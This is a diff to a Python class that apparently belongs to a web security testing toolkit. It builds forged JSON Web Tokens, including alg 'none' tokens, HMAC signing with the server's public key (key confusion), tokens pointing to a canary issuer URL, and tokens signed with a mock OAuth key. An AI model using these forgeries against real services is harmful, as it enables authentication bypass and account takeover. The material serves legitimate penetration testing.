@@ -10,9 +10,16 @@ import hashlib
 import hmac
 import random
 import string
+import datetime
+from waabi.utility.reader import Reader
 
 class Jwty(object):
-
+    
+    @staticmethod
+    def Uenc(part):
+        part = json.dumps(part) if part else '{}'
+        return base64.urlsafe_b64encode(part.encode()).strip(b'=')
+ 
     def __init__(self,t):
         parts = t.split(".")
         self.header = jwt.get_unverified_header(t)
@@ -21,8 +28,7 @@ class Jwty(object):
         self.encoded = t
         self.errors = []
         self.public_key = self._get_public_key()
-    
-    
+
     def _get_public_key(self):
         if self.header["alg"][:2] == "RS":
             try:
@@ -37,14 +43,14 @@ class Jwty(object):
                 self.errors.append("Error getting public Key: {0}".format(str(ex)))
         return None
 
+   
     def AsAlgNone(self):
         header = {
             "alg": "none",
             "typ": "JWT"
         }
-
-        eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
-        ep = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).strip(b'=')
+        eh = Jwty.Uenc(header)
+        ep = Jwty.Uenc(self.payload)
         return "{0}.{1}.".format(eh.decode(),ep.decode())
 
 
@@ -55,8 +61,8 @@ class Jwty(object):
                 "typ": "JWT"
             }
 
-            eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
-            ep = base64.urlsafe_b64encode(json.dumps(self.payload).encode()).strip(b'=')
+            eh = Jwty.Uenc(header)
+            ep = Jwty.Uenc(self.payload)
             sig = base64.urlsafe_b64encode(hmac.new(self.public_key, eh + b'.' + ep, hashlib.sha256).digest().strip()).strip(b'=')
 
            
@@ -74,20 +80,79 @@ class Jwty(object):
     def WithCanaryIss(self,canary): 
         header = self.header
         payload = self.payload
-        if "kid" in header.keys(): 
-            header["kid"] = "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(43))
-            payload["iss"] = "{0}oauth2/lidukgiq45hkkpxfucuq5b1qo".format(canary)
-            eh = base64.urlsafe_b64encode(json.dumps(header).encode()).strip(b'=')
-            ep = base64.urlsafe_b64encode(json.dumps(payload).encode()).strip(b'=')
-            return "{0}.{1}.{2}".format(
-                eh.decode(),
-                ep.decode(),
-                self.signature
+        
+        header["kid"] = "".join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(43))
+        header["alg"] = "RS256"
+        payload["iss"] = "{0}oauth2/lidukgiq45hkkpxfucuq5b1qo".format(canary)
+        eh = Jwty.Uenc(header)
+        ep = Jwty.Uenc(payload)
+        return "{0}.{1}.{2}".format(
+            eh.decode(),
+            ep.decode(),
+            self.signature
+        )
+
+    def WithMockOauth(self,issuer,private_key_file,kid):
+        iat = int(datetime.datetime.now().timestamp())
+        headers = {
+            "kid": kid
+        }
+        payload = self.payload
+        payload["iss"] = issuer
+        payload["iat"] = iat
+        payload["exp"] = iat + 3600
+        
+        try:
+            token = jwt.encode(
+                payload,
+                Reader.Read(private_key_file),
+                algorithm="RS256",
+                headers=headers
             )
-        else: 
-            return "No Kid found. A Canary won't work..."
+            return token
+        except Exception as ex:
+            return "Error encoding token: {0}".format(ex)
+
+    @staticmethod    
+    def Construct(payload, keyfile, kid, issuer, header, secret, signature):
+        alg = header["alg"] if header and "alg" in header.keys() else False
 
 
+        if secret:
+            if not alg:
+                return "Error: Header containing an alg must be present when supplying secret."
+            else: 
+                try: 
+                    header.pop("alg",None)
+                    token = jwt.encode(
+                        payload,
+                        secret,
+                        algorithm=alg,
+                        headers=header
+
+                    )
+                    return token
+                except Exception as ex: 
+                    return "Error encoding token: {0}".format(ex)
+
+        if signature: 
+            eh = Jwty.Uenc(header)
+            ep = Jwty.Uenc(payload)
+            return "{0}.{1}.{2}".format(eh.decode(),ep.decode(),signature)
 
 
+        header = header if header else {}
+        header["alg"] = "RS256"
+        header["kid"] = kid
+        payload["iss"] = issuer
+        try: 
+            token = jwt.encode(
+                payload,
+                Reader.Read(keyfile),
+                algorithm="RS256",
+                headers=header
+            )
+            return token
+        except Exception as ex: 
+            return "Error encoding token: {0}".format(ex)
 
